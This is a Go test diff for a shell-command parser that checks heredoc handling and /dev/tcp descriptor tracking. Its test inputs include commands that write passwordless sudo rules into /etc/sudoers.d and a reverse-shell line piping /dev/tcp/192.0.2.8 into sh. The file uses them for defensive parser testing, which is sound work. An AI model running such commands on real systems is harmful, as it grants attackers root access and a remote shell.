@@ -106,8 +106,18 @@ func TestParsePOSIXQuotedHeredocLiteralStdin(t *testing.T) {
 		t.Fatalf("quoted heredoc redirects = %#v", quoted.commands[0].Redirects)
 	}
 
+	// An unquoted body that expands only parameters keeps the parse
+	// complete, but its text is never literal stdin (rel-1-0-6:GAP-0399).
+	expanding := parsePOSIX("cat > /etc/sudoers.d/service << EOF\n$USER ALL=(ALL) NOPASSWD: ALL\nEOF", 1, 0)
+	if expanding.status != StatusComplete || len(expanding.commands) != 1 {
+		t.Fatalf("parameter-only heredoc output = %#v", expanding)
+	}
+	if content, ok := StaticPOSIXCatLiteralStdinOutput(expanding.commands[0]); ok || content != "" {
+		t.Fatalf("an expanding heredoc exposed literal stdin: %q, %t", content, ok)
+	}
+
 	for _, source := range []string{
-		"cat > /etc/sudoers.d/service << EOF\n$USER ALL=(ALL) NOPASSWD: ALL\nEOF",
+		"cat > /etc/sudoers.d/service << EOF\n$(id -un) ALL=(ALL) NOPASSWD: ALL\nEOF",
 		"cat > /etc/sudoers.d/service <<- 'EOF'\n\trestricted-service ALL=(ALL) NOPASSWD: ALL\nEOF",
 		"cat < /tmp/input > /etc/sudoers.d/service << 'EOF'\nrestricted-service ALL=(ALL) NOPASSWD: ALL\nEOF",
 		"cat << 'ONE' << 'TWO' > /etc/sudoers.d/service\nfirst\nONE\nsecond\nTWO",
@@ -2043,6 +2053,25 @@ func TestParsePOSIXReadWriteAndAllFDRedirects(t *testing.T) {
 	if !ok || access != PathAccessWrite || posixRedirectFD(syntax.RdrAll) != -1 {
 		t.Fatalf("RdrAll projection = access=%q ok=%v fd=%d",
 			access, ok, posixRedirectFD(syntax.RdrAll))
+	}
+
+	feedback := parsePOSIX(`exec 3<>/dev/tcp/192.0.2.8/443; cat <&3 | sh >&3`, 1, 0)
+	if feedback.status != StatusComplete || len(feedback.commands) != 3 ||
+		len(feedback.commands[1].Redirects) != 1 ||
+		feedback.commands[1].Redirects[0].Target != "/dev/tcp/192.0.2.8/443" ||
+		len(feedback.commands[2].Redirects) != 1 ||
+		feedback.commands[2].Redirects[0].Target != "/dev/tcp/192.0.2.8/443" {
+		t.Fatalf("descriptor duplication was not completely resolved: %#v", feedback)
+	}
+	closed := parsePOSIX(`exec 3<>/dev/tcp/127.0.0.1/443; exec 3>&-; cat <&3`, 1, 0)
+	if len(closed.commands) != 3 || len(closed.commands[2].Redirects) != 1 ||
+		closed.commands[2].Redirects[0].Target != "" {
+		t.Fatalf("closed descriptor retained an earlier target: %#v", closed)
+	}
+	piped := parsePOSIX(`exec 3<>/dev/tcp/127.0.0.1/443 | cat; cat <&3`, 1, 0)
+	if len(piped.commands) != 3 || len(piped.commands[2].Redirects) != 1 ||
+		piped.commands[2].Redirects[0].Target != "" {
+		t.Fatalf("pipeline descriptor leaked into the parent shell: %#v", piped)
 	}
 }
 
